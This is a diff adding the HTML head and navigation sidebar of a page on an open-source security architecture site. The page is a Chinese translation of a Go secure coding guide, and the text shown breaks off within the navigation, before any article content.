@@ -1,0 +1,5115 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+        <meta name="description" content="开源安全架构">
+      
+      
+        <link rel="canonical" href="https://bloodzer0.github.io/ossa/application-security/sdl/go-scp/">
+      
+      
+        <meta name="author" content="bloodzer0">
+      
+      
+        <meta name="lang:clipboard.copy" content="Copy to clipboard">
+      
+        <meta name="lang:clipboard.copied" content="Copied to clipboard">
+      
+        <meta name="lang:search.language" content="en">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="No matching documents">
+      
+        <meta name="lang:search.result.one" content="1 matching document">
+      
+        <meta name="lang:search.result.other" content="# matching documents">
+      
+        <meta name="lang:search.tokenizer" content="[\s\-]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-3.1.0">
+    
+    
+      
+        <title>Go语言安全编码规范-翻译 - Open-Source Security Architecture</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.11e41852.css">
+      
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.20ef595d.js"></script>
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700|Roboto+Mono">
+        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
+      
+    
+    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
+    
+    
+    
+  </head>
+  
+    <body dir="ltr">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448"
+    viewBox="0 0 416 448" id="__github">
+  <path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19-18.125
+        8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19 18.125-8.5
+        18.125 8.5 10.75 19 3.125 20.5zM320 304q0 10-3.125 20.5t-10.75
+        19-18.125 8.5-18.125-8.5-10.75-19-3.125-20.5 3.125-20.5 10.75-19
+        18.125-8.5 18.125 8.5 10.75 19 3.125 20.5zM360
+        304q0-30-17.25-51t-46.75-21q-10.25 0-48.75 5.25-17.75 2.75-39.25
+        2.75t-39.25-2.75q-38-5.25-48.75-5.25-29.5 0-46.75 21t-17.25 51q0 22 8
+        38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0
+        37.25-1.75t35-7.375 30.5-15 20.25-25.75 8-38.375zM416 260q0 51.75-15.25
+        82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5-41.75
+        1.125q-19.5 0-35.5-0.75t-36.875-3.125-38.125-7.5-34.25-12.875-30.25-20.25-21.5-28.75q-15.5-30.75-15.5-82.75
+        0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25
+        30.875q36.75-8.75 77.25-8.75 37 0 70 8 26.25-20.5
+        46.75-30.25t47.25-9.75q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34
+        99.5z" />
+</svg>
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
+    
+      <a href="#go-" tabindex="1" class="md-skip">
+        Skip to content
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="https://bloodzer0.github.io/ossa/" title="Open-Source Security Architecture" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon"></i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                Open-Source Security Architecture
+              </span>
+              <span class="md-header-nav__topic">
+                Go语言安全编码规范-翻译
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="__search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            Type to start searching
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+        <div class="md-flex__cell md-flex__cell--shrink">
+          <div class="md-header-nav__source">
+            
+
+
+  
+
+
+  <a href="https://github.com/bloodzer0/ossa" title="Go to repository" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      bloodzer0/ossa
+    </div>
+  </a>
+
+          </div>
+        </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="__drawer">
+    <a href="https://bloodzer0.github.io/ossa/" title="Open-Source Security Architecture" class="md-nav__button md-logo">
+      
+        <i class="md-icon"></i>
+      
+    </a>
+    Open-Source Security Architecture
+  </label>
+  
+    <div class="md-nav__source">
+      
+
+
+  
+
+
+  <a href="https://github.com/bloodzer0/ossa" title="Go to repository" class="md-source" data-md-source="github">
+    
+      <div class="md-source__icon">
+        <svg viewBox="0 0 24 24" width="24" height="24">
+          <use xlink:href="#__github" width="24" height="24"></use>
+        </svg>
+      </div>
+    
+    <div class="md-source__repository">
+      bloodzer0/ossa
+    </div>
+  </a>
+
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="ossa" class="md-nav__link">
+      ossa
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      Application security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        Application security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../" title="应用安全" class="md-nav__link">
+      应用安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-2" type="checkbox" id="nav-2-2">
+    
+    <label class="md-nav__link" for="nav-2-2">
+      Code audit
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-2">
+        Code audit
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../code-audit/" title="代码审计" class="md-nav__link">
+      代码审计
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../code-audit/ethereum-smart-contracts-code-audit/" title="智能合约代码审计" class="md-nav__link">
+      智能合约代码审计
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../code-audit/sonarqube/" title="sonarqube：代码质量管理平台" class="md-nav__link">
+      sonarqube：代码质量管理平台
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-3" type="checkbox" id="nav-2-3">
+    
+    <label class="md-nav__link" for="nav-2-3">
+      Mobile security
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-3">
+        Mobile security
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../mobile-security/" title="移动安全" class="md-nav__link">
+      移动安全
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../mobile-security/mobile-security-scanner/" title="移动安全扫描" class="md-nav__link">
+      移动安全扫描
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../mobile-security/mobile-tools/" title="移动安全工具" class="md-nav__link">
+      移动安全工具
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-4" type="checkbox" id="nav-2-4" checked>
+    
+    <label class="md-nav__link" for="nav-2-4">
+      Sdl
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-4">
+        Sdl
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../api-gateway/" title="API网关" class="md-nav__link">
+      API网关
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../api-security-design/" title="API网关设计" class="md-nav__link">
+      API网关设计
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Go语言安全编码规范-翻译
+      </label>
+    
+    <a href="./" title="Go语言安全编码规范-翻译" class="md-nav__link md-nav__link--active">
+      Go语言安全编码规范-翻译
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">Table of contents</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="介绍" class="md-nav__link">
+    介绍
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#checkmarx" title="关于Checkmarx" class="md-nav__link">
+    关于Checkmarx
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#owasp" title="关于OWASP安全编程实践" class="md-nav__link">
+    关于OWASP安全编程实践
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="输入验证" class="md-nav__link">
+    输入验证
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="验证" class="md-nav__link">
+    验证
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="用户交互" class="md-nav__link">
+    用户交互
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="文件操作" class="md-nav__link">
+    文件操作
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" title="数据源" class="md-nav__link">
+    数据源
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post" title="POST验证操作" class="md-nav__link">
+    POST验证操作
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" title="处理" class="md-nav__link">
+    处理
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_8" title="将小于字符的单个字符转化为实体" class="md-nav__link">
+    将小于字符的单个字符转化为实体
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" title="删除所有标签" class="md-nav__link">
+    删除所有标签
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" title="删除换行符、制表符和多余的空格" class="md-nav__link">
+    删除换行符、制表符和多余的空格
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url" title="URL请求路径" class="md-nav__link">
+    URL请求路径
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" title="输出编码" class="md-nav__link">
+    输出编码
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#xss" title="XSS跨站脚本" class="md-nav__link">
+    XSS跨站脚本
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql" title="SQL注入" class="md-nav__link">
+    SQL注入
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_12" title="认证与密码管理" class="md-nav__link">
+    认证与密码管理
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" title="认证与密码管理" class="md-nav__link">
+    认证与密码管理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" title="经验规则" class="md-nav__link">
+    经验规则
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" title="身份验证数据通信" class="md-nav__link">
+    身份验证数据通信
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" title="验证与存储" class="md-nav__link">
+    验证与存储
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_17" title="验证" class="md-nav__link">
+    验证
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" title="安全存储密码理论" class="md-nav__link">
+    安全存储密码理论
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_19" title="安全存储密码实践" class="md-nav__link">
+    安全存储密码实践
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" title="密码策略" class="md-nav__link">
+    密码策略
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_21" title="重置" class="md-nav__link">
+    重置
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_22" title="其它指南" class="md-nav__link">
+    其它指南
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#session" title="Session管理" class="md-nav__link">
+    Session管理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_23" title="访问控制" class="md-nav__link">
+    访问控制
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_24" title="密码学实践" class="md-nav__link">
+    密码学实践
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" title="伪随机生成器" class="md-nav__link">
+    伪随机生成器
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_26" title="错误处理和记录" class="md-nav__link">
+    错误处理和记录
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_27" title="错误处理" class="md-nav__link">
+    错误处理
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_28" title="日志" class="md-nav__link">
+    日志
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_29" title="数据保护" class="md-nav__link">
+    数据保护
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_30" title="删除敏感信息" class="md-nav__link">
+    删除敏感信息
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_31" title="注释" class="md-nav__link">
+    注释
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#url_1" title="URL" class="md-nav__link">
+    URL
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_32" title="信息就是力量" class="md-nav__link">
+    信息就是力量
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_33" title="加密是关键" class="md-nav__link">
+    加密是关键
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_34" title="禁用不需要的内容" class="md-nav__link">
+    禁用不需要的内容
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_35" title="自动完成" class="md-nav__link">
+    自动完成
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_36" title="缓存" class="md-nav__link">
+    缓存
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_37" title="通信安全" class="md-nav__link">
+    通信安全
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#httptls" title="HTTP/TLS" class="md-nav__link">
+    HTTP/TLS
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#websockets" title="Websockets" class="md-nav__link">
+    Websockets
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#origin-header" title="Origin header" class="md-nav__link">
+    Origin header
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_38" title="机密性和完整性" class="md-nav__link">
+    机密性和完整性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_39" title="认证和授权" class="md-nav__link">
+    认证和授权
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_40" title="输入数据清理" class="md-nav__link">
+    输入数据清理
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_41" title="系统配置" class="md-nav__link">
+    系统配置
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_42" title="目录列表" class="md-nav__link">
+    目录列表
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_43" title="删除/禁用你不需要的内容" class="md-nav__link">
+    删除/禁用你不需要的内容
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_44" title="实现更好的安全性" class="md-nav__link">
+    实现更好的安全性
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_45" title="资产管理系统：" class="md-nav__link">
+    资产管理系统：
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_46" title="数据库安全" class="md-nav__link">
+    数据库安全
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_47" title="最佳实践" class="md-nav__link">
+    最佳实践
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_48" title="数据库连接" class="md-nav__link">
+    数据库连接
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_49" title="概念" class="md-nav__link">
+    概念
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_50" title="连接字符串的保护" class="md-nav__link">
+    连接字符串的保护
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_51" title="数据库证书" class="md-nav__link">
+    数据库证书
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_52" title="数据库认证" class="md-nav__link">
+    数据库认证
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_53" title="以最小权限访问数据库" class="md-nav__link">
+    以最小权限访问数据库
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_54" title="使用强密码" class="md-nav__link">
+    使用强密码
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_55" title="删除默认的管理密码" class="md-nav__link">
+    删除默认的管理密码
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_56" title="参数化查询" class="md-nav__link">
+    参数化查询
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_57" title="示例" class="md-nav__link">
+    示例
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_58" title="存储过程" class="md-nav__link">
+    存储过程
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_59" title="文件管理" class="md-nav__link">
+    文件管理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_60" title="内存管理" class="md-nav__link">
+    内存管理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_61" title="通用编码实践" class="md-nav__link">
+    通用编码实践
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_62" title="跨站请求伪造" class="md-nav__link">
+    跨站请求伪造
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_63" title="攻击场景" class="md-nav__link">
+    攻击场景
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_64" title="问题" class="md-nav__link">
+    问题
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_65" title="解决方案" class="md-nav__link">
+    解决方案
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_66" title="正则表达式" class="md-nav__link">
+    正则表达式
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#re2" title="为什么是RE2" class="md-nav__link">
+    为什么是RE2
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_67" title="正则表达式拒绝服务攻击" class="md-nav__link">
+    正则表达式拒绝服务攻击
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_68" title="少了什么" class="md-nav__link">
+    少了什么
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../xss/" title="Xss" class="md-nav__link">
+      Xss
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-5" type="checkbox" id="nav-2-5">
+    
+    <label class="md-nav__link" for="nav-2-5">
+      Security defense
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-5">
+        Security defense
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-defense/https/" title="全站https" class="md-nav__link">
+      全站https
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-defense/iptables-waf/" title="iptables-waf" class="md-nav__link">
+      iptables-waf
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-defense/modsecurity-waf/" title="modsecurity-waf" class="md-nav__link">
+      modsecurity-waf
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-defense/openresty-waf/" title="openresty-waf" class="md-nav__link">
+      openresty-waf
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-defense/waf/" title="Web应用防火墙" class="md-nav__link">
+      Web应用防火墙
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6" type="checkbox" id="nav-2-6">
+    
+    <label class="md-nav__link" for="nav-2-6">
+      Security testing
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-6">
+        Security testing
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/" title="安全测试" class="md-nav__link">
+      安全测试
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/api-security-testing/" title="API安全测试" class="md-nav__link">
+      API安全测试
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/app-security-testing/" title="APP安全测试" class="md-nav__link">
+      APP安全测试
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/checklist/" title="安全测试checklist" class="md-nav__link">
+      安全测试checklist
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/dast-iast-sast/" title="DAST&SAST&IAST" class="md-nav__link">
+      DAST&SAST&IAST
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-6-6" type="checkbox" id="nav-2-6-6">
+    
+    <label class="md-nav__link" for="nav-2-6-6">
+      Tools skills
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-2-6-6">
+        Tools skills
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/tools-skills/app/" title="APP脱壳技巧" class="md-nav__link">
+      APP脱壳技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/tools-skills/capture-https/" title="https抓包" class="md-nav__link">
+      https抓包
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/tools-skills/capture-skills/" title="抓包技巧" class="md-nav__link">
+      抓包技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/tools-skills/information-leakage/" title="信息泄漏漏洞利用" class="md-nav__link">
+      信息泄漏漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../security-testing/tools-skills/web-tools/" title="Web安全工具" class="md-nav__link">
+      Web安全工具
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2-7" type="checkbox" id="nav-2-7">
+    
+    <label class="md-nav__link" for="nav-2-7">
+      Vulnerability management
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-2-7">
+        Vulnerability management
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../vulnerability-management/" title="漏洞管理" class="md-nav__link">
+      漏洞管理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
